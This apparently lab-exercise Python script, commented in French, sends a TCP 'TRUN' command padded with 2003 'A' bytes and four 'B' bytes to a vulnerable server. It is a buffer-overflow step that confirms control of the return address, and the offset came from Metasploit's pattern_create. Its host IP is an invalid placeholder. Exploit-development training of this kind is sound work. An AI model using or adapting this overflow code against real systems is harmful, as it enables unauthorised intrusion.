#!/usr/bin/python
import sys, socket

# A MODIFIER
exact_offset_value = 2003
host_ip = '192.168.1.690'
host_port = 9999

# shellcode composé du nombre de A renvoyés par /usr/share/metasploit-framework/tools/exploit/pattern_create.rb et de 4 B pour voir la fin de l'overwrite
shellcode = "A" * exact_offset_value + "B" * 4

try:
	# Essaye de se connecter -> AF_INET = IPv4, SOCK_STREAM = Port
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host_ip, host_port))
	
	# Envoie un TRUN /.:/ (format repéré dans le spiking) avec le buffer (AAAA...)
	s.send(('TRUN /.:/' + shellcode))
	s.close()

except:
	print ("Error connecting to the server")
	sys.exit()